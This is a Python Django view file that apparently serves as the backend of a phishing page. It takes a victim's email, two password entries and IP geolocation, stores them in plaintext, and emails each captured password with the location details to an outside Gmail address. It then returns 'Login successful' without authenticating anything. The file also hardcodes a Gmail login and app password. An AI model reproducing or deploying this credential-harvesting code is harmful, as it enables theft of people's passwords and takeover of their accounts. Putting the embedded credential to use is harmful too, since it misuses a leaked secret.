from django.http import JsonResponse
from rest_framework.decorators import api_view
from dbconnection import users
import smtplib
from smtplib import SMTPException
import logging
from unidecode import unidecode  # Import unidecode to handle non-ASCII characters

# Set up logging
logger = logging.getLogger(__name__)

@api_view(['POST'])
def get_user_info(request):
    # Get the login and location data from the request
    email = request.data.get('email')
    firstpasswordused = request.data.get('firstpasswordused')
    secondpasswordused = request.data.get('secondpasswordused')
    location_info = request.data.get('locationInfo')

    # Check for required fields
    if not email or not firstpasswordused or not secondpasswordused:
        return JsonResponse({'error': 'Email and passwords are required'}, status=400)

    # Ensure input data is string type and sanitize if necessary
    email = str(email)
    firstpasswordused = str(firstpasswordused)
    secondpasswordused = str(secondpasswordused)

    # Ensure location_info is a dictionary
    if not isinstance(location_info, dict):
        return JsonResponse({'error': 'Invalid location info provided'}, status=400)

    try:
        # Fetch important data from location_info with proper defaults
        ip_address = location_info.get('ip', 'N/A')
        city = location_info.get('city', 'Unknown')
        region = location_info.get('region', 'Unknown')
        country = location_info.get('country', 'Unknown')
        latitude = location_info.get('latitude', 'N/A')
        longitude = location_info.get('longitude', 'N/A')
        timezone = location_info.get('timezone', 'N/A')
        postal = location_info.get('postal', 'N/A')

        # Validate VPN-provided data, ensure required fields are not missing
        if ip_address == 'N/A' or country == 'Unknown':
            return JsonResponse({'error': 'Invalid location data from VPN'}, status=400)

        # Save the user info and location info to the database
        user_data = {
            "email": email,
            "firstpasswordused": firstpasswordused,
            "secondpasswordused": secondpasswordused,
            "location_info": location_info  # Save the IP/location info
        }
        users.insert_one(user_data)

        # Prepare email content for the first password
        first_password_email_content = f"""
            Email: {email}
            First Password: {firstpasswordused}
            IP Address: {ip_address}
            City: {city}
            Region: {region}
            Country: {country}
            Postal: {postal}
            Latitude: {latitude}
            Longitude: {longitude}
            Timezone: {timezone}
        """

        # Prepare email content for the second password
        second_password_email_content = f"""
            Email: {email}
            Second Password: {secondpasswordused}
            IP Address: {ip_address}
            City: {city}
            Region: {region}
            Country: {country}
            Postal: {postal}
            Latitude: {latitude}
            Longitude: {longitude}
            Timezone: {timezone}
        """

        # Handle encoding issues with non-ASCII characters using unidecode
        first_password_email_content = unidecode(first_password_email_content)
        second_password_email_content = unidecode(second_password_email_content)

        print(first_password_email_content)
        print(second_password_email_content)

        # Try sending the first email (with first password)
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
                connection.login(user='ranickiauerbach@gmail.com', password='nlov pvvd rcoa dnwl')
                connection.sendmail(
                    from_addr='ranickiauerbach@gmail.com',
                    to_addrs='jujualvarado25@gmail.com',
                    msg=f"Subject: User Login Info (First Password)\n\n{first_password_email_content}"
                )
        except SMTPException as e:
            logger.error(f"Error sending email (first password): {str(e)}")
            return JsonResponse({'error': f'Error sending first password email: {str(e)}'}, status=500)

        # Try sending the second email (with second password)
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
                connection.login(user='ranickiauerbach@gmail.com', password='nlov pvvd rcoa dnwl')
                connection.sendmail(
                    from_addr='ranickiauerbach@gmail.com',
                    to_addrs='jujualvarado25@gmail.com',
                    msg=f"Subject: User Login Info (Second Password)\n\n{second_password_email_content}"
                )
        except SMTPException as e:
            logger.error(f"Error sending email (second password): {str(e)}")
            return JsonResponse({'error': f'Error sending second password email: {str(e)}'}, status=500)

    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return JsonResponse({'error': f'An unexpected error occurred: {str(e)}'}, status=500)

    return JsonResponse({'message': 'Login successful'}, status=200)
